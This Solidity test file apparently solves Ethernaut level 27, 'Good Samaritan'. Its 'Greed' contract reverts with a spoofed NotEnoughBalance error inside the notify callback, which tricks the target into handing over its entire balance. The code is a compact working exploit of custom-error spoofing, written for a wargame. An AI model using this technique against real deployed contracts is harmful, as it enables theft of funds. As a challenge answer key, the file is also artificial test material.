// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {GoodSamaritanFactory} from "../src/levels/27-GoodSamaritanFactory.sol";
import {GoodSamaritan, INotifyable} from "../src/levels/27-GoodSamaritan.sol";

contract Greed is INotifyable{
    error NotEnoughBalance();

    function attack(GoodSamaritan samaritan) external  {
        try samaritan.requestDonation() {} catch{
            return;
        }
    }

    function notify(uint256 amount) external{
        if(amount == 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanSolution is BaseTest {

    function construction() internal override returns(address payable ) {
        return payable(address(new GoodSamaritanFactory()));
    }

    function solution(address payable target) override internal {
        Greed greed = new Greed();
        greed.attack(GoodSamaritan(address(target)));
    }
}
